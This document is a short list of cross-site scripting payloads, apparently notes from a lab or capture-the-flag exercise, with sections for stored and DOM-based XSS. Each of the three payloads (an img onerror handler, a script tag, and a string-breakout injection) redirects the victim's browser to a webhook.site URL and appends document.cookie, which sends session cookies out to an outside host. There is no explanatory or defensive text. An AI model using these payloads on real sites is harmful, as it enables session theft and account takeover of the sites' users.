XSS - Stored 1
<img src=1 onerror='document.location="https://webhook.site/61cc437c-77fa-4337-aa68-a804df57d667?cmd="+document.cookie'/>
<script>document.location='https://webhook.site/61cc437c-77fa-4337-aa68-a804df57d667?cmd='+document.cookie</script>

DOM-XSS
test'; document.location='https://webhook.site/61cc437c-77fa-4337-aa68-a804df57d667?cmd='+document.cookie;//